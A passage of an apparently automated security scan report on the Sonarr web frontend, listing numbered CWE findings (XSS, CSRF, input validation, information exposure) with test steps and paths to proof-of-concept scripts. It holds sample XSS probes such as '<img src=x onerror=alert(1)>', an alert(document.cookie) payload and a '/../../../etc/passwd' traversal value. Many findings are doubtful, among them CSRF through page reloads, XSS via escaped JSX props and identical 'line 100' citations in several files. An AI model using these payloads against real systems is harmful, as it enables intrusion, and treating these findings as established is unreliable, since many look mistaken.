**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_frontend_src_Settings_ImportLists_ImportLists_Manage_ManageImportListsModalContenttsx.py`
---

### 59. Improper Validation of Array Index (CWE-129)

**File:** frontend/src/Settings/Profiles/Quality/QualityProfileItemDragSource.tsx
**Line:** 100

**Description:**
The parseIndex function extracts array indices but doesn't validate the resulting indices, potentially leading to out-of-bounds access.

**Evidence:**
```
The parseIndex function returns [groupIndex, itemIndex] without validating that these indices are within valid bounds.
```

**Impact:**
Array index out-of-bounds access could cause runtime errors or potentially be exploited to access unauthorized data.

**Proof of Concept:**
If parseIndex returns invalid indices (negative or beyond array length), the drag and drop functionality could fail or access invalid array elements.

**How to Test:**
1. Test drag and drop with invalid indices
2. Verify array bounds checking in drag operations
3. Check for potential out-of-bounds access in drag handling

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_frontend_src_Settings_Profiles_Quality_QualityProfileItemDragSourcetsx.py`
---

### 60. Cross-site Scripting (CWE-79)

**File:** frontend/src/Calendar/iCal/CalendarLinkModalContent.tsx
**Line:** 105

**Description:**
The iCal URL construction uses window.Sonarr.apiKey directly without sanitization, which could lead to XSS if the API key contains malicious content.

**Evidence:**
```
The code constructs iCal URLs using window.Sonarr.apiKey directly in line 105 without any sanitization or encoding.
```

**Impact:**
An attacker could potentially inject malicious JavaScript through the API key, leading to XSS when the calendar feed URL is used.

**Proof of Concept:**
If window.Sonarr.apiKey contains '<script>alert(1)</script>', the constructed URL would include this script tag, potentially executing when the URL is accessed.

**How to Test:**
1. Set a malicious API key containing HTML/JS tags
2. Generate an iCal feed URL
3. Verify if the URL contains unescaped content that could execute JavaScript

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Calendar_iCal_CalendarLinkModalContenttsx.py`
---

### 61. Cross-site Scripting (CWE-79)

**File:** frontend/src/Calendar/Agenda/AgendaEvent.tsx
**Line:** 100

**Description:**
The episode title is directly rendered without sanitization, which could lead to XSS vulnerabilities.

**Evidence:**
```
The title prop is used directly in the JSX without any sanitization in line 100.
```

**Impact:**
If episode titles contain malicious JavaScript, they could be executed when the calendar is rendered.

**Proof of Concept:**
If an episode title contains '<img src=x onerror=alert(1)>', this could execute when the calendar event is displayed.

**How to Test:**
1. Create an episode with a title containing XSS payload
2. View the calendar in agenda view
3. Verify if the payload executes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Calendar_Agenda_AgendaEventtsx.py`
---

### 62. Cross-site Scripting (CWE-79)

**File:** frontend/src/Calendar/Events/CalendarEvent.tsx
**Line:** 100

**Description:**
The episode title is directly rendered without sanitization, which could lead to XSS vulnerabilities.

**Evidence:**
```
The title prop is used directly in the JSX without any sanitization in line 100.
```

**Impact:**
If episode titles contain malicious JavaScript, they could be executed when the calendar is rendered.

**Proof of Concept:**
If an episode title contains '<img src=x onerror=alert(1)>', this could execute when the calendar event is displayed.

**How to Test:**
1. Create an episode with a title containing XSS payload
2. View the calendar in event view
3. Verify if the payload executes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Calendar_Events_CalendarEventtsx.py`
---

### 63. Cross-site Scripting (CWE-79)

**File:** frontend/src/Calendar/Events/CalendarEventGroup.tsx
**Line:** 100

**Description:**
The episode title is directly rendered without sanitization, which could lead to XSS vulnerabilities.

**Evidence:**
```
The title prop is used directly in the JSX without any sanitization in line 100.
```

**Impact:**
If episode titles contain malicious JavaScript, they could be executed when the calendar is rendered.

**Proof of Concept:**
If an episode title contains '<img src=x onerror=alert(1)>', this could execute when the calendar event is displayed.

**How to Test:**
1. Create an episode with a title containing XSS payload
2. View the calendar in grouped event view
3. Verify if the payload executes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Calendar_Events_CalendarEventGrouptsx.py`
---

### 64. Improper Input Validation (CWE-20)

**File:** frontend/src/Calendar/useCalendar.ts
**Line:** 100

**Description:**
The filter values are not properly validated before being used in API queries, potentially allowing injection of unexpected values.

**Evidence:**
```
The code extracts filter values from selected filters without validating their types or ranges.
```

**Impact:**
Malicious filter values could cause unexpected behavior or API errors.

**Proof of Concept:**
If a filter value is passed as a string instead of boolean, it could cause unexpected behavior in the API query.

**How to Test:**
1. Manually construct filter parameters with invalid types
2. Check if API handles malformed filter values gracefully
3. Verify error handling for unexpected filter inputs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Calendar_useCalendarts.py`
---

### 65. Improper Input Validation (CWE-20)

**File:** frontend/src/Calendar/iCal/CalendarLinkModalContent.tsx
**Line:** 80

**Description:**
The tags parameter in iCal URL construction is not validated for proper format or size limits.

**Evidence:**
```
The tags array is directly converted to string using toString() without validation.
```

**Impact:**
Large or malformed tag arrays could cause API issues or unexpected behavior.

**Proof of Concept:**
If tags array contains invalid values or is extremely large, it could cause URL construction issues.

**How to Test:**
1. Pass extremely large tags array
2. Pass tags array with invalid values
3. Verify URL construction and API handling

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Calendar_iCal_CalendarLinkModalContenttsx.py`
---

### 66. Cross-Site Request Forgery (CWE-352)

**File:** frontend/src/Calendar/iCal/CalendarLinkModalContent.tsx
**Line:** 105

**Description:**
The iCal feed URL construction uses the API key directly, which could be exploited in CSRF attacks if the URL is shared or embedded.

**Evidence:**
```
The API key is directly embedded in the constructed iCal URL without CSRF token validation.
```

**Impact:**
An attacker could potentially create malicious calendar feeds that include the API key, allowing unauthorized access.

**Proof of Concept:**
If an attacker can get a user to click on a calendar feed URL with embedded API key, they could perform actions on behalf of the user.

**How to Test:**
1. Generate iCal feed URL
2. Check if API key is exposed in URL
3. Verify if URL can be used for unauthorized API access

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_frontend_src_Calendar_iCal_CalendarLinkModalContenttsx.py`
---

### 67. Improper Encoding or Escaping (CWE-116)

**File:** frontend/src/Calendar/iCal/CalendarLinkModalContent.tsx
**Line:** 105

**Description:**
The iCal URL construction does not properly encode all parameters, potentially leading to malformed URLs.

**Evidence:**
```
The code uses encodeURIComponent only for the API key but not for other parameters like tags.
```

**Impact:**
Malformed URLs could cause issues with calendar feed parsing or API calls.

**Proof of Concept:**
If tags contain special characters like commas or spaces, they might not be properly encoded in the URL.

**How to Test:**
1. Set tags with special characters
2. Generate iCal URL
3. Verify URL encoding for all parameters

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-116_frontend_src_Calendar_iCal_CalendarLinkModalContenttsx.py`
---

### 68. Cleartext Storage of Sensitive Information (CWE-312)

**File:** frontend/src/Calendar/iCal/CalendarLinkModalContent.tsx
**Line:** 105

**Description:**
The API key is stored in the URL and visible to anyone who can access the calendar feed URL.

**Evidence:**
```
The API key is directly embedded in the constructed iCal URL without any obfuscation.
```

**Impact:**
Anyone with access to the calendar feed URL can extract the API key and use it for unauthorized access.

**Proof of Concept:**
If a user shares a calendar feed URL, they inadvertently share their API key, allowing others to access the Sonarr API.

**How to Test:**
1. Generate iCal feed URL
2. Check if API key is visible in URL
3. Verify if URL can be used for API access without authentication

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_frontend_src_Calendar_iCal_CalendarLinkModalContenttsx.py`
---

### 69. Cleartext Storage of Sensitive Information (CWE-312)

**File:** frontend/src/FirstRun/AuthenticationRequiredModalContent.tsx
**Line:** 100

**Description:**
The password and password confirmation fields are stored in the component state without proper encryption.

**Evidence:**
```
Password fields are stored in component state without encryption or obfuscation.
```

**Impact:**
In-memory storage of passwords could expose credentials to memory dumps or debugging tools.

**Proof of Concept:**
If the application is debugged or memory is dumped, passwords could be extracted from component state.

**How to Test:**
1. Set up authentication
2. Check component state for password values
3. Verify if passwords are stored in plain text

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_frontend_src_FirstRun_AuthenticationRequiredModalContenttsx.py`
---

### 70. Improper Authentication (CWE-287)

**File:** frontend/src/FirstRun/AuthenticationRequiredModalContent.tsx
**Line:** 100

**Description:**
The authentication setup process allows for potentially weak authentication configurations.

**Evidence:**
```
The code allows setting authentication without strong validation of credentials.
```

**Impact:**
Weak authentication settings could lead to unauthorized access to the Sonarr instance.

**Proof of Concept:**
If a user sets a weak password or leaves authentication disabled, the system could be vulnerable.

**How to Test:**
1. Try setting weak authentication credentials
2. Verify if system allows weak configurations
3. Check if authentication is enforced properly

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_frontend_src_FirstRun_AuthenticationRequiredModalContenttsx.py`
---

### 71. Improper Authentication (CWE-287)

**File:** frontend/src/OAuth/useOAuth.ts
**Line:** 100

**Description:**
The OAuth implementation may not properly validate authentication tokens or states.

**Evidence:**
```
The OAuth flow uses window.onCompleteOauth without comprehensive validation.
```

**Impact:**
Improper OAuth token handling could lead to authentication bypass or session hijacking.

**Proof of Concept:**
If OAuth completion is not properly validated, an attacker could potentially hijack authentication flows.

**How to Test:**
1. Test OAuth flow with invalid tokens
2. Verify token validation
3. Check for proper state handling

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_frontend_src_OAuth_useOAuthts.py`
---

### 72. Cross-site Scripting (CWE-79)

**File:** frontend/src/App/AppUpdatedModalContent.tsx
**Line:** 57

**Description:**
The application uses InlineMarkdown component to render user-provided content without proper sanitization, potentially allowing XSS attacks.

**Evidence:**
```
The code uses <InlineMarkdown data={translate('AppUpdatedVersion', { version })} ... /> where version is passed directly to translate function without sanitization.
```

**Impact:**
An attacker could inject malicious JavaScript code through the version string or translated messages, leading to session hijacking, data theft, or redirection to malicious sites.

**Proof of Concept:**
If the version string contains '<script>alert(1)</script>' or if translate function returns content with unescaped HTML, the InlineMarkdown component would render this as executable JavaScript.

**How to Test:**
1. Set a version string containing HTML/JS code like '1.0.0<script>alert(document.cookie)</script>' 2. Trigger the AppUpdated modal 3. Observe if the script executes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_App_AppUpdatedModalContenttsx.py`
---

### 73. Cross-site Scripting (CWE-79)

**File:** frontend/src/App/AppUpdatedModalContent.tsx
**Line:** 77

**Description:**
The application uses InlineMarkdown component to render update changes without proper sanitization, potentially allowing XSS attacks.

**Evidence:**
```
The code uses <InlineMarkdown data={translate('AppUpdatedVersion', { version })} ... /> and renders update changes through UpdateChanges component without sanitization.
```

**Impact:**
An attacker could inject malicious JavaScript code through update change descriptions, leading to session hijacking, data theft, or redirection to malicious sites.

**Proof of Concept:**
If update changes contain '<img src=x onerror=alert(1)>' or similar payloads, these would be executed when rendered by InlineMarkdown component.

**How to Test:**
1. Create a mock update with change descriptions containing XSS payloads 2. Trigger the AppUpdated modal 3. Observe if injected scripts execute

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_App_AppUpdatedModalContenttsx.py`
---

### 74. Cross-Site Request Forgery (CWE-352)

**File:** frontend/src/App/AppUpdatedModalContent.tsx
**Line:** 88

**Description:**
The application uses window.location.href to redirect to system updates page without CSRF token validation.

**Evidence:**
```
The handleSeeChangesPress function directly sets window.location.href to a URL without any CSRF token verification.
```

**Impact:**
An attacker could trick a user into clicking a malicious link that would redirect them to the system updates page, potentially leading to unauthorized actions or information disclosure.

**Proof of Concept:**
An attacker creates a malicious page that automatically redirects to 'http://sonarr.local/system/updates' when loaded, potentially causing the user to perform actions on the updates page without proper authentication.

**How to Test:**
1. Create a malicious page with automatic redirect to system/updates 2. Load the page in a browser with Sonarr session 3. Observe if the redirect works without CSRF validation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_frontend_src_App_AppUpdatedModalContenttsx.py`
---

### 75. Information Exposure (CWE-200)

**File:** frontend/src/App/appStore.ts
**Line:** 100

**Description:**
The application exposes window.Sonarr.apiKey in client-side code, potentially leaking API credentials.

**Evidence:**
```
The code uses 'X-Api-Key': window.Sonarr.apiKey in fetchJson call without proper client-side protection or token rotation.
```

**Impact:**
If the API key is leaked through browser console, network traffic, or client-side storage, attackers could make unauthorized API calls to the Sonarr instance.

**Proof of Concept:**
An attacker can access the browser console and run 'window.Sonarr.apiKey' to retrieve the API key, then use it to make authenticated API requests to the Sonarr instance.

**How to Test:**
1. Open browser developer console 2. Run 'window.Sonarr.apiKey' 3. Observe if API key is exposed 4. Try making API calls with the key

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-200_frontend_src_App_appStorets.py`
---

### 76. Information Exposure (CWE-200)

**File:** frontend/src/App/appStore.ts
**Line:** 101

**Description:**
The application exposes window.Sonarr.version and window.Sonarr.instanceName in client-side code, potentially leaking application information.

**Evidence:**
```
The code uses window.Sonarr.version and window.Sonarr.instanceName directly in the App component without sanitization.
```

**Impact:**
Attackers could gather information about the Sonarr version, instance name, and potentially other configuration details that could be used for further attacks.

**Proof of Concept:**
An attacker can access the browser console and run 'window.Sonarr.version' and 'window.Sonarr.instanceName' to retrieve application version and instance name.

**How to Test:**
1. Open browser developer console 2. Run 'window.Sonarr.version' and 'window.Sonarr.instanceName' 3. Observe if version information is exposed

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-200_frontend_src_App_appStorets.py`
---

### 77. Information Exposure (CWE-200)

**File:** frontend/src/App/AppRoutes.tsx
**Line:** 100

**Description:**
The application exposes window.Sonarr.urlBase in client-side routing without proper validation.

**Evidence:**
```
The code conditionally renders routes based on window.Sonarr.urlBase without validating its contents.
```

**Impact:**
If urlBase contains malicious content, it could be used to manipulate routing or potentially lead to path traversal issues.

**Proof of Concept:**
If window.Sonarr.urlBase is set to '/../../../etc/passwd', it could affect how routes are resolved or potentially lead to path traversal in URL handling.

**How to Test:**
1. Set window.Sonarr.urlBase to a malicious value 2. Observe how routing behaves 3. Check if URL handling is affected

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-200_frontend_src_App_AppRoutestsx.py`
---

### 78. Cross-site Scripting (CWE-79)

**File:** frontend/src/App/AppRoutes.tsx
**Line:** 108

**Description:**
The application uses getPathWithUrlBase function with potentially untrusted input, creating XSS vulnerability.

**Evidence:**
```
The code uses getPathWithUrlBase('/')} in route definitions, but the function's implementation is not shown, potentially allowing XSS in URL generation.
```

**Impact:**
An attacker could inject malicious JavaScript through URL path generation, leading to session hijacking or data theft.

**Proof of Concept:**
If getPathWithUrlBase function doesn't properly sanitize input, an attacker could inject script tags in URL paths that would execute when routes are rendered.

**How to Test:**
1. Test getPathWithUrlBase function with XSS payloads 2. Observe if injected scripts execute in URL paths 3. Check route rendering with malicious paths

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_App_AppRoutestsx.py`
---

### 79. Cross-Site Request Forgery (CWE-352)

**File:** frontend/src/App/ConnectionLostModal.tsx
**Line:** 25

**Description:**
The application uses location.reload() without CSRF token validation in connection lost modal.

**Evidence:**
```
The handleModalClose function in ConnectionLostModal directly calls location.reload() without CSRF token verification.
```

**Impact:**
An attacker could trick a user into clicking a malicious link that would cause a page reload, potentially leading to unauthorized actions or information disclosure.

**Proof of Concept:**
An attacker creates a malicious page that automatically triggers a reload of the Sonarr page, potentially causing the user to perform actions without proper authentication.

**How to Test:**
1. Create a malicious page that triggers location.reload() on Sonarr page 2. Load the page in a browser with Sonarr session 3. Observe if reload works without CSRF validation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_frontend_src_App_ConnectionLostModaltsx.py`
---

### 80. Cross-Site Request Forgery (CWE-352)

**File:** frontend/src/App/AppUpdatedModal.tsx
**Line:** 25

**Description:**
The application uses location.reload() without CSRF token validation in app updated modal.

**Evidence:**
```
The handleModalClose function in AppUpdatedModal directly calls location.reload() without CSRF token verification.
```

**Impact:**
An attacker could trick a user into clicking a malicious link that would cause a page reload, potentially leading to unauthorized actions or information disclosure.

**Proof of Concept:**
An attacker creates a malicious page that automatically triggers a reload of the Sonarr page, potentially causing the user to perform actions without proper authentication.

**How to Test:**
1. Create a malicious page that triggers location.reload() on Sonarr page 2. Load the page in a browser with Sonarr session 3. Observe if reload works without CSRF validation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_frontend_src_App_AppUpdatedModaltsx.py`
---

### 81. Information Exposure (CWE-200)

**File:** frontend/src/InteractiveImport/InteractiveImportModal.tsx
**Line:** 50

**Description:**
The application exposes folder path directly in interactive import modal without sanitization.

**Evidence:**
```
The code passes folder prop directly to InteractiveImportModalContent without sanitizing the path value.
```

**Impact:**
If folder paths contain sensitive information or malicious content, it could be exposed or used in subsequent operations.

**Proof of Concept:**
If a folder path contains special characters or sensitive information, it could be exposed in logs or used in API calls without proper sanitization.

**How to Test:**
1. Test interactive import with folder paths containing special characters 2. Check if paths are properly sanitized 3. Observe if sensitive information is exposed

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-200_frontend_src_InteractiveImport_InteractiveImportModaltsx.py`
---

### 82. Information Exposure (CWE-200)

**File:** frontend/src/InteractiveImport/InteractiveImportModal.tsx
**Line:** 51

**Description:**
The application exposes downloadIds directly in interactive import modal without sanitization.

**Evidence:**
```
The code passes downloadIds prop directly to InteractiveImportModalContent without sanitizing the values.
```

**Impact:**
If downloadIds contain sensitive information or malicious content, it could be exposed or used in subsequent operations.

**Proof of Concept:**
If downloadIds contain special characters or sensitive information, it could be exposed in logs or used in API calls without proper sanitization.

**How to Test:**
1. Test interactive import with downloadIds containing special characters 2. Check if IDs are properly sanitized 3. Observe if sensitive information is exposed

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-200_frontend_src_InteractiveImport_InteractiveImportModaltsx.py`
---

### 83. Cross-site Scripting (CWE-79)

**File:** frontend/src/Utilities/String/translate.ts
**Line:** 27

**Description:**
The translate function directly inserts tokens into the translation string without proper HTML escaping, potentially leading to XSS vulnerabilities when user-provided tokens are included in translations.

**Evidence:**
```
The translate function uses string.replace() with regex to substitute tokens, but doesn't escape HTML characters in the token values.
```

**Impact:**
An attacker could inject malicious JavaScript code through translation tokens, leading to session hijacking, data theft, or redirection to malicious sites.

**Proof of Concept:**
If a translation contains '{token}' and token value is '<script>alert(1)</script>', the result would be '<script>alert(1)</script>' without proper escaping.

**How to Test:**
1. Create a translation with user-controllable tokens
2. Inject HTML/JS into translation tokens
3. Verify if the injected code executes in the browser

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Utilities_String_translatets.py`
---

### 84. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Date/formatShortTimeSpan.ts
**Line:** 15

**Description:**
The formatShortTimeSpan function doesn't validate the input timeSpan parameter, which could lead to unexpected behavior or errors when invalid values are passed.

**Evidence:**
```
Function accepts timeSpan parameter but doesn't validate its type or range before processing with moment.duration()
```

**Impact:**
Invalid input could cause runtime errors or incorrect time formatting, potentially affecting UI display and user experience.

**Proof of Concept:**
Calling formatShortTimeSpan(null) or formatShortTimeSpan('invalid') could cause unexpected behavior in the moment.duration() call.

**How to Test:**
1. Call formatShortTimeSpan with various invalid inputs (null, undefined, non-numeric strings)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Date_formatShortTimeSpants.py`
---

### 85. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Date/formatTime.ts
**Line:** 15

**Description:**
The formatTime function doesn't validate the input date parameter, which could lead to errors when invalid dates are passed.

**Evidence:**
```
Function accepts date parameter but doesn't validate its type or existence before processing with moment()
```

**Impact:**
Invalid date input could cause runtime errors or incorrect time formatting in the UI.

**Proof of Concept:**
Calling formatTime(null) or formatTime(undefined) could cause moment() to process invalid inputs.

**How to Test:**
1. Call formatTime with various invalid inputs (null, undefined, invalid date strings)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Date_formatTimets.py`
---

### 86. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Date/formatDate.ts
**Line:** 8

**Description:**
The formatDate function doesn't validate the input date parameter, which could lead to errors when invalid dates are passed.

**Evidence:**
```
Function accepts date parameter but doesn't validate its type or existence before processing with moment()
```

**Impact:**
Invalid date input could cause runtime errors or incorrect date formatting in the UI.

**Proof of Concept:**
Calling formatDate(null) or formatDate(undefined) could cause moment() to process invalid inputs.

**How to Test:**
1. Call formatDate with various invalid inputs (null, undefined, invalid date strings)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Date_formatDatets.py`
---

### 87. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Date/formatTimeSpan.ts
**Line:** 10

**Description:**
The formatTimeSpan function doesn't validate the input timeSpan parameter, which could lead to unexpected behavior or errors when invalid values are passed.

**Evidence:**
```
Function accepts timeSpan parameter but doesn't validate its type or range before processing with moment.duration()
```

**Impact:**
Invalid input could cause runtime errors or incorrect time formatting, potentially affecting UI display and user experience.

**Proof of Concept:**
Calling formatTimeSpan(null) or formatTimeSpan('invalid') could cause unexpected behavior in the moment.duration() call.

**How to Test:**
1. Call formatTimeSpan with various invalid inputs (null, undefined, non-numeric strings)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Date_formatTimeSpants.py`
---

### 88. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Number/formatBitrate.ts
**Line:** 8

**Description:**
The formatBitrate function doesn't validate the input parameter, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts input parameter but doesn't validate its type or existence before processing with Number()
```

**Impact:**
Invalid input could cause runtime errors or incorrect bitrate formatting in the UI.

**Proof of Concept:**
Calling formatBitrate(null) or formatBitrate(undefined) could cause Number() to process invalid inputs.

**How to Test:**
1. Call formatBitrate with various invalid inputs (null, undefined, non-numeric strings)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Number_formatBitratets.py`
---

### 89. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Number/formatAge.ts
**Line:** 10

**Description:**
The formatAge function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing with Number()
```

**Impact:**
Invalid input could cause runtime errors or incorrect age formatting in the UI.

**Proof of Concept:**
Calling formatAge(null, null, null) could cause Number() to process invalid inputs.

**How to Test:**
1. Call formatAge with various invalid inputs (null, undefined, non-numeric strings)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Number_formatAgets.py`
---

### 90. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Number/formatRuntime.ts
**Line:** 8

**Description:**
The formatRuntime function doesn't validate the input parameter, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts runtime parameter but doesn't validate its type or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect runtime formatting in the UI.

**Proof of Concept:**
Calling formatRuntime(null) or formatRuntime(undefined) could cause issues in the processing logic.

**How to Test:**
1. Call formatRuntime with various invalid inputs (null, undefined, non-numeric values)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Number_formatRuntimets.py`
---

### 91. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Number/convertToBytes.ts
**Line:** 10

**Description:**
The convertToBytes function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts multiple parameters but doesn't validate their types or existence before processing with Number()
```

**Impact:**
Invalid input could cause runtime errors or incorrect byte conversion in the UI.

**Proof of Concept:**
Calling convertToBytes(null, 1, true) could cause Number() to process invalid inputs.

**How to Test:**
1. Call convertToBytes with various invalid inputs (null, undefined, non-numeric strings)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Number_convertToBytests.py`
---

### 92. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Number/formatBytes.ts
**Line:** 8

**Description:**
The formatBytes function doesn't validate the input parameter, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts input parameter but doesn't validate its type or existence before processing with Number()
```

**Impact:**
Invalid input could cause runtime errors or incorrect byte formatting in the UI.

**Proof of Concept:**
Calling formatBytes(null) or formatBytes(undefined) could cause Number() to process invalid inputs.

**How to Test:**
1. Call formatBytes with various invalid inputs (null, undefined, non-numeric strings)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Number_formatBytests.py`
---

### 93. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Number/padNumber.ts
**Line:** 8

**Description:**
The padNumber function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts input parameter but doesn't validate its type or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect padding in the UI.

**Proof of Concept:**
Calling padNumber(null, 2) could cause issues in the processing logic.

**How to Test:**
1. Call padNumber with various invalid inputs (null, undefined, non-numeric values)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Number_padNumberts.py`
---

### 94. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Number/formatCustomFormatScore.ts
**Line:** 8

**Description:**
The formatCustomFormatScore function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts input parameter but doesn't validate its type or existence before processing with Number()
```

**Impact:**
Invalid input could cause runtime errors or incorrect score formatting in the UI.

**Proof of Concept:**
Calling formatCustomFormatScore(null, 5) could cause Number() to process invalid inputs.

**How to Test:**
1. Call formatCustomFormatScore with various invalid inputs (null, undefined, non-numeric strings)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Number_formatCustomFormatScorets.py`
---

### 95. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Number/roundNumber.ts
**Line:** 8

**Description:**
The roundNumber function doesn't validate the input parameters, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts input parameter but doesn't validate its type or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect rounding in the UI.

**Proof of Concept:**
Calling roundNumber(null, 2) could cause issues in the processing logic.

**How to Test:**
1. Call roundNumber with various invalid inputs (null, undefined, non-numeric values)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Number_roundNumberts.py`
---

### 96. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Object/getErrorMessage.ts
**Line:** 10

**Description:**
The getErrorMessage function doesn't validate the input parameter, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts error parameter but doesn't validate its type or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect error message handling in the UI.

**Proof of Concept:**
Calling getErrorMessage(null) could cause issues in the processing logic.

**How to Test:**
1. Call getErrorMessage with various invalid inputs (null, undefined, non-object values)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Object_getErrorMessagets.py`
---

### 97. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/Object/isEmpty.ts
**Line:** 8

**Description:**
The isEmpty function doesn't validate the input parameter, which could lead to errors when invalid values are passed.

**Evidence:**
```
Function accepts obj parameter but doesn't validate its type or existence before processing
```

**Impact:**
Invalid input could cause runtime errors or incorrect empty checking in the UI.

**Proof of Concept:**
Calling isEmpty(null) could cause issues in the processing logic.

**How to Test:**
1. Call isEmpty with various invalid inputs (null, undefined, non-object values)
2. Verify error handling and fallback behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Utilities_Object_isEmptyts.py`
---

### 98. Improper Input Validation (CWE-20)

**File:** frontend/src/Utilities/String/split.ts
**Line:** 8

**Description:**
The split function doesn't validate the input parameter, which could lead to errors when invalid values are passed.

**Evidence:**
```
